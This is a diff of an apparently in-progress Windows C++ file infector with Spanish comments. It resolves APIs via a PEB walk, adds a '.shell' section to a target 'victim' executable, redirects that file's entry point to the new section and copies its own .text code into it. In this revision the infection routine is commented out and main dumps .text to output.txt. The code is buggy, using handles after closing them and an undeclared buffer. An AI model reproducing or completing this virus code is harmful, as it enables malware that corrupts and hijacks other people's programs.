@@ -1,7 +1,6 @@
 #include <Windows.h>
 #include "peb-lookup.h"
-#include <string>
-#include <sstream>
+
 
 // Strings almacenados en la sección .text
 #pragma code_seg(".text")
@@ -77,7 +76,7 @@ HANDLE(WINAPI* _CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwS
 BOOL(WINAPI* _WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
 void* (WINAPI* _memset)(void* dest, int value, size_t num);
 BOOL(WINAPI* _FlushViewOfFile)(LPCVOID lpBaseAddress, SIZE_T dwNumberOfBytesToFlush);
-DWORD(WINAPI* _GetLastError)();  // Declarar GetLastError
+
 
 // Función para inicializar las funciones globales
 bool InitializeFunctions() {
@@ -116,25 +115,15 @@ bool InitializeFunctions() {
     _FlushViewOfFile = (BOOL(WINAPI*)(LPCVOID, SIZE_T)) _GetProcAddress(k32_dll, "FlushViewOfFile");
     _memset = (void* (WINAPI*)(void*, int, size_t))_GetProcAddress(hLibC, "memset");
 
-    // Inicializar GetLastError
-    _GetLastError = (DWORD(WINAPI*)()) _GetProcAddress(k32_dll, "GetLastError");
+
 
     return _GetFileSize && _MapViewOfFile && _UnmapViewOfFile && _CreateFileMappingA && _ReadFile && _MessageBoxW &&
         _MultiByteToWideChar && _CloseHandle && _strncmp && _strcpy_s && _ZeroMemory && _SetFilePointer &&
-        _SetEndOfFile && _malloc && _memcpy && _CreateFileA && _WriteFile && _FlushViewOfFile && _memset && _GetLastError;
+        _SetEndOfFile && _malloc && _memcpy && _CreateFileA && _WriteFile && _FlushViewOfFile && _memset;
 }
-// Función para convertir un valor numérico a un string wide (wstring)
-std::wstring to_wstring(int value) {
-    std::wstringstream wss;
-    wss << value;
-    return wss.str();
-}
-void showError(DWORD error) {
-    std::wstring message = L"Error occurred. Error code: ";
-    message += std::to_wstring(error);
 
-    _MessageBoxW(0, message.c_str(), L"Error", MB_OK);
-}
+
+
 // Función para copiar la sección .text a .shell
 bool CopyTextToShell(LPVOID exeBase, DWORD textSectionSize) {
     DWORD shellSectionSize = textSectionSize;  // O ajusta según sea necesario
@@ -153,10 +142,10 @@ bool CopyTextToShell(LPVOID exeBase, DWORD textSectionSize) {
     return true;
 }
 
-bool AddShellSectionAndModifyEntryPoint(HANDLE hFile_vic) {
+/*bool AddShellSectionAndModifyEntryPoint(HANDLE hFile_vic) {
     const DWORD shellSectionSize = 4096;  // Por ejemplo, 4 KB para el tamaño de la sección
     HANDLE hMapping = _CreateFileMappingA(hFile_vic, nullptr, PAGE_READWRITE, 0, 0, nullptr);
-  
+
     if (!hMapping) {
         // Handle error if mapping creation fails
         _MessageBoxW(0, L"Error creating file mapping.", L"Error", MB_OK);
@@ -216,7 +205,7 @@ bool AddShellSectionAndModifyEntryPoint(HANDLE hFile_vic) {
 
     _MessageBoxW(0, L"New Section Created", L"Debugging", MB_OK);
     _memset(newSectionHeader, 0, sizeof(IMAGE_SECTION_HEADER)); // Initialize the new section header
-    
+
     _MessageBoxW(0, L"memset", L"Debugging", MB_OK);
     // Set section name and characteristics
     _memcpy(newSectionHeader->Name, ".shell", sizeof(".shell") - 1);
@@ -225,37 +214,30 @@ bool AddShellSectionAndModifyEntryPoint(HANDLE hFile_vic) {
     newSectionHeader->SizeOfRawData = shellSectionSize;
     newSectionHeader->PointerToRawData = ntHeaders->OptionalHeader.SizeOfImage;
 
- 
+
     // Modify the entry point to point to the new shellcode section
     ntHeaders->OptionalHeader.AddressOfEntryPoint = newSectionHeader->VirtualAddress;
 
     // Update the SizeOfImage field in the OptionalHeader
     ntHeaders->OptionalHeader.SizeOfImage += shellSectionSize;
 
-   
+
 
     // Convierte a una cadena multibyte de forma segura
     char* charString = new char[12];
     size_t convertedChars = 0;
 
 
-    // Luego usa strcpy_s para copiar la cadena convertida
-    
-    if (pBase) {
-        _strcpy_s(pBase, 12, charString);
-           _FlushViewOfFile(pBase, 0);
-           _UnmapViewOfFile(pBase);
-           _MessageBoxW(0, L"Hola ", L"Error", MB_OK);
-        }
-        _CloseHandle(hMapping);
-    
+
+    _CloseHandle(hMapping);
+
     _CloseHandle(hFile_vic);
 
-   
-   
+
+
     if (_SetFilePointer(hFile_vic, 0, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
-       
-        _MessageBoxW(0, L"Error setting file pointer. " , L"Error", MB_OK);
+
+        _MessageBoxW(0, L"Error setting file pointer. ", L"Error", MB_OK);
         _UnmapViewOfFile(pBase);
         _CloseHandle(hMapping);
         _CloseHandle(hFile_vic);
@@ -275,7 +257,7 @@ bool AddShellSectionAndModifyEntryPoint(HANDLE hFile_vic) {
     DWORD bytesWritten = 0;
     BOOL writeSuccess = _WriteFile(hFile_vic, pBase, ntHeaders->OptionalHeader.SizeOfImage, &bytesWritten, NULL);
     if (!writeSuccess || bytesWritten != ntHeaders->OptionalHeader.SizeOfImage) {
-      
+
         _MessageBoxW(0, L"Failed to write to file. Error code: ", L"Error", MB_OK);
         return false;
     }
@@ -287,7 +269,7 @@ bool AddShellSectionAndModifyEntryPoint(HANDLE hFile_vic) {
 
     _MessageBoxW(0, L"PE File modified successfully.", L"Success", MB_OK);
     return true;
-}
+}*/
 
 // Función auxiliar para alinear valores
 DWORD ALIGN_UP(DWORD size, DWORD align) {
@@ -350,21 +332,20 @@ int main() {
     BOOL result = _ReadFile(hFile, buffer, bufferSize - 1, &bytesRead, NULL);
     _MessageBoxW(0, L"File was read", L"Depuracion", MB_OK);
     if (result && bytesRead > 0) {
-      // Agregar carácter nulo para terminar la cadena
-      buffer[bytesRead] = '\0';
-       // Mostrar contenido leído (requiere `_MessageBoxW` o `_MultiByteToWideChar`)
-      wchar_t wideBuffer[bufferSize] = { 0 };
-      _MultiByteToWideChar(CP_ACP, 0, buffer, bytesRead, wideBuffer, bufferSize);
-       _MessageBoxW(0, wideBuffer, L"Contenido del Archivo", MB_OK);
-        }
-        else {
-            _MessageBoxW(0, L"I cant read a main file!", L"Error", MB_OK);
-        }
-   
-        _CloseHandle(hFile);
-        // invoke the message box winapi
-        _MessageBoxW(0, L"File was closed", L"Depuracion", MB_OK);
-  
+        // Agregar carácter nulo para terminar la cadena
+        buffer[bytesRead] = '\0';
+        // Mostrar contenido leído (requiere `_MessageBoxW` o `_MultiByteToWideChar`)
+        wchar_t wideBuffer[bufferSize] = { 0 };
+        _MultiByteToWideChar(CP_ACP, 0, buffer, bytesRead, wideBuffer, bufferSize);
+        _MessageBoxW(0, wideBuffer, L"Contenido del Archivo", MB_OK);
+    }
+    else {
+        _MessageBoxW(0, L"I cant read a main file!", L"Error", MB_OK);
+    }
+
+    _CloseHandle(hFile);
+    // invoke the message box winapi
+    _MessageBoxW(0, L"File was closed", L"Depuracion", MB_OK);
     hFile = _CreateFileA(
         fileName,              // Nombre del archivo
         GENERIC_READ,          // Permisos de lectura
@@ -407,55 +388,151 @@ int main() {
     DWORD sectionSize = 0;
     void* textSection = GetTextSection(exeBase, &sectionSize);
     if (textSection) {
-        _MessageBoxW(0, L"Sección .text encontrada.  ", L"Aviso", MB_OK);
-    
+        _MessageBoxW(0, L"Sección .text encontrada.", L"Aviso", MB_OK);
     }
     else {
         _MessageBoxW(0, L"No se encontró la sección .text.", L"Error", MB_OK);
     }
-    // invoke the message box winapi
-    _MessageBoxW(0, L"GetTextSection(exeBase, &sectionSize, strncmp_func)", L"Depuracion", MB_OK);
 
+    // Debugging messages
+    _MessageBoxW(0, L"GetTextSection(exeBase, &sectionSize)", L"Depuración", MB_OK);
+
+    // Unmap the view of the file
     _UnmapViewOfFile(exeBase);
-    // invoke the message box winapi
-    _MessageBoxW(0, L"UnmapViewOfFile(exeBase)", L"Depuracion", MB_OK);
+    _MessageBoxW(0, L"UnmapViewOfFile(exeBase)", L"Depuración", MB_OK);
+
+    // Close file handles
     _CloseHandle(hMapping);
-    // invoke the message box winapi
-    _MessageBoxW(0, L"_CloseHandle(hMapping)", L"Depuracion", MB_OK);
+    _MessageBoxW(0, L"_CloseHandle(hMapping)", L"Depuración", MB_OK);
 
     _CloseHandle(hFile);
-    // invoke the message box winapi
-    _MessageBoxW(0, L"_CloseHandle(hFile)", L"Depuracion", MB_OK);
+    _MessageBoxW(0, L"_CloseHandle(hFile)", L"Depuración", MB_OK);
 
-   
-    HANDLE hFile_vic = _CreateFileA(
-        fileName_vic,              // Nombre del archivo
-        GENERIC_READ | GENERIC_WRITE,          // Permisos de lectura
-        0,                     // No compartir
-        NULL,                  // Seguridad predeterminada
-        OPEN_EXISTING,         // Abrir archivo existente
-        FILE_ATTRIBUTE_NORMAL, // Atributos normales
-        NULL);                 // No hay plantilla de archivo
+    // Open a new file for writing
+    HANDLE hFileWrite = _CreateFileA("output.txt", GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFileWrite == INVALID_HANDLE_VALUE) {
+        _MessageBoxW(0, L"Error al abrir el archivo de salida", L"Error", MB_OK);
+        return 6;  // Error opening output file
+    }
 
-    if (hFile_vic == INVALID_HANDLE_VALUE) {
-        _MessageBoxW(0, L"Error al abrir el archivo vic", L"Error", MB_OK);
-        return 5; // Error al abrir el archivo
+    _MessageBoxW(0, L"File opened for writing", L"Depuración", MB_OK);
+
+    // Write the .text section to the output file
+    DWORD bytesWritten = 0;
+    if (!_WriteFile(hFileWrite, textSection, sectionSize, &bytesWritten, NULL)) {
+        _MessageBoxW(0, L"Error writing to file", L"Error", MB_OK);
+        _CloseHandle(hFileWrite);
+        return 7;  // Error writing to output file
     }
-    _MessageBoxW(0, L"_CreateFileA(2x)", L"Depuracion", MB_OK);
-    bool AddedEntryPoint = AddShellSectionAndModifyEntryPoint(hFile_vic);
-    _MessageBoxW(0, L"Add section", L"Depuracion", MB_OK);
-    // Copiar contenido de .text a .shell
-      
-    if (CopyTextToShell(exeBase, sectionSize)) {
-        _MessageBoxW(0, L"Contenido de .text copiado a .shell", L"Éxito", MB_OK);
+
+    // Ensure all data was written
+    if (bytesWritten != sectionSize) {
+        _MessageBoxW(0, L"Not all data was written to the file", L"Warning", MB_OK);
     }
-    else {
-        _MessageBoxW(0, L"Error al copiar la sección .text", L"Error", MB_OK);
-    }
-    // Limpiar recursos
-    _UnmapViewOfFile(exeBase);
-    _CloseHandle(hMapping);
-    _CloseHandle(hFile_vic);
+
+    // Clean up
+    _CloseHandle(hFileWrite);
+    _MessageBoxW(0, L"File write completed", L"Depuración", MB_OK);
+
+    _CloseHandle(hFileWrite);
 
     return 0;
 }
+
+
+
+/* hFile = _CreateFileA(
+     fileName,              // Nombre del archivo
+     GENERIC_READ,          // Permisos de lectura
+     0,                     // No compartir
+     NULL,                  // Seguridad predeterminada
+     OPEN_EXISTING,         // Abrir archivo existente
+     FILE_ATTRIBUTE_NORMAL, // Atributos normales
+     NULL);                 // No hay plantilla de archivo
+
+ if (hFile == INVALID_HANDLE_VALUE) {
+     _MessageBoxW(0, L"Error al abrir el archivo", L"Error", MB_OK);
+     return 5; // Error al abrir el archivo
+ }
+ // invoke the message box winapi
+ _MessageBoxW(0, L"_CreateFileA", L"Depuracion", MB_OK);
+
+ DWORD fileSize = _GetFileSize(hFile, NULL);
+ // invoke the message box winapi
+ _MessageBoxW(0, L"GetFileSize(hFile, NULL)", L"Depuracion", MB_OK);
+
+ HANDLE hMapping = _CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
+ if (!hMapping) {
+     _MessageBoxW(0, L"Error creating file mapping.", L"Error", MB_OK);
+     _CloseHandle(hFile);
+     return 1;
+ }
+ // invoke the message box winapi
+ _MessageBoxW(0, L"GetFileSize(hFile, NULL)", L"Depuracion", MB_OK);
+
+ void* exeBase = _MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
+ if (!exeBase) {
+     _MessageBoxW(0, L"Error mapping view of file..", L"Error", MB_OK);
+     _CloseHandle(hMapping);
+     _CloseHandle(hFile);
+     return 1;
+ }
+ // invoke the message box winapi
+ _MessageBoxW(0, L"MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0)", L"Depuracion", MB_OK);
+
+ DWORD sectionSize = 0;
+ void* textSection = GetTextSection(exeBase, &sectionSize);
+ if (textSection) {
+     _MessageBoxW(0, L"Sección .text encontrada.  ", L"Aviso", MB_OK);
+
+ }
+ else {
+     _MessageBoxW(0, L"No se encontró la sección .text.", L"Error", MB_OK);
+ }
+ // invoke the message box winapi
+ _MessageBoxW(0, L"GetTextSection(exeBase, &sectionSize, strncmp_func)", L"Depuracion", MB_OK);
+
+ _UnmapViewOfFile(exeBase);
+ // invoke the message box winapi
+ _MessageBoxW(0, L"UnmapViewOfFile(exeBase)", L"Depuracion", MB_OK);
+ _CloseHandle(hMapping);
+ // invoke the message box winapi
+ _MessageBoxW(0, L"_CloseHandle(hMapping)", L"Depuracion", MB_OK);
+
+ _CloseHandle(hFile);
+ // invoke the message box winapi
+ _MessageBoxW(0, L"_CloseHandle(hFile)", L"Depuracion", MB_OK);
+
+
+ HANDLE hFile_vic = _CreateFileA(
+     fileName_vic,              // Nombre del archivo
+     GENERIC_READ | GENERIC_WRITE,          // Permisos de lectura
+     0,                     // No compartir
+     NULL,                  // Seguridad predeterminada
+     OPEN_EXISTING,         // Abrir archivo existente
+     FILE_ATTRIBUTE_NORMAL, // Atributos normales
+     NULL);                 // No hay plantilla de archivo
+
+ if (hFile_vic == INVALID_HANDLE_VALUE) {
+     _MessageBoxW(0, L"Error al abrir el archivo vic", L"Error", MB_OK);
+     return 5; // Error al abrir el archivo
+ }
+ _MessageBoxW(0, L"_CreateFileA(2x)", L"Depuracion", MB_OK);
+ bool AddedEntryPoint = AddShellSectionAndModifyEntryPoint(hFile_vic);
+ _MessageBoxW(0, L"Add section", L"Depuracion", MB_OK);
+ // Copiar contenido de .text a .shell
+
+ if (CopyTextToShell(exeBase, sectionSize)) {
+     _MessageBoxW(0, L"Contenido de .text copiado a .shell", L"Éxito", MB_OK);
+ }
+ else {
+     _MessageBoxW(0, L"Error al copiar la sección .text", L"Error", MB_OK);
+ }
+ // Limpiar recursos
+ _UnmapViewOfFile(exeBase);
+ _CloseHandle(hMapping);
+ _CloseHandle(hFile_vic);
+
+ return 0;
+}*/
+
